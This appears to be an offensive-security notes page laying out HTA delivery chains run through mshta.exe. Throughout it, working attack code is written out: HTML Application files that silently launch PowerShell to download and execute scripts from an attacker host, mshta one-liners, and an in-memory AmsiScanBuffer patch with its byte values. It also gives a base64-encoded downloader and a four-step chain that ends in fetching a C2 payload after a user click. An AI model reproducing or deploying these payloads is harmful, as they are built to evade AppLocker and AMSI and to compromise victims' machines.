## HTA Chains

HTML Applications executed by `mshta.exe`. Can bypass AppLocker scripting rules since `mshta.exe` is often whitelisted.

---

### Basic HTA with JScript

```html
<head>
    <HTA:APPLICATION
        APPLICATIONNAME="Update"
        WINDOWSTATE="minimize"
        SHOWINTASKBAR="no"
        SINGLEINSTANCE="yes"
    />
    <script language="JScript">
        var shell = new ActiveXObject("WScript.Shell");
        var res = shell.Run("powershell -ep bypass -c IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/payload.ps1')");
        self.close();
    </script>
</head>
<body></body>
```

### Execution Methods

```sh
# Direct execution
mshta.exe http://<ATTACKER_IP>/payload.hta

# From command line (useful in other payloads)
mshta.exe "javascript:var s=new ActiveXObject('WScript.Shell');s.Run('calc.exe');close();"
```

> `mshta.exe` bypasses AppLocker scripting rules because the binary itself is whitelisted — the JScript/VBScript runs inside the HTA context.

---

### HTA + AMSI Bypass Chain (Full 4-Step)

Complete delivery chain: HTA → encoded PowerShell → AMSI bypass PS1 → C2 payload.

**Step 1:** Host C2 payload via Scripted Web Delivery (CS) or HTTP server.

**Step 2:** Write a .NET loader with AMSI bypass (`amsi.ps1`):

```powershell
$Win32 = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)

[Byte[]] $payload = 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3
[System.Runtime.InteropServices.Marshal]::Copy($payload, 0, $Address, 6)

IEX((New-Object System.Net.WebClient).DownloadString('http://<ATTACKER_IP>/a'))
```

**Step 3:** Encode a downloader for the PS1 script:

```powershell
[Convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes("IEX ((new-object net.webclient).downloadstring('http://<ATTACKER_IP>/amsi.ps1'))"))
```

**Step 4:** Embed into HTA file:

```html
<!DOCTYPE html>
<html>
<head>
    <HTA:APPLICATION icon="#" WINDOWSTATE="minimize" SHOWINTASKBAR="no"
    SYSMENU="no" CAPTION="no" />
    <script language="VBScript">
    Function var_func()
    Dim var_shell
    Set var_shell = CreateObject("Wscript.Shell")
    var_shell.run "powershell.exe -e <ENCODED_POWERSHELL>", 0, true
    End Function
    var_func
    self.close
    </script>
</head>
<body>
</body>
</html>
```

**Delivery:** Host HTA → user clicks → PS1 downloaded → AMSI bypassed → C2 payload fetched and executed in memory.

---

> See also: [[AppLocker]], [[AmsiScanBuffer Patch]], [[2. Weaponisation & Delivery/JScript Dropper]]
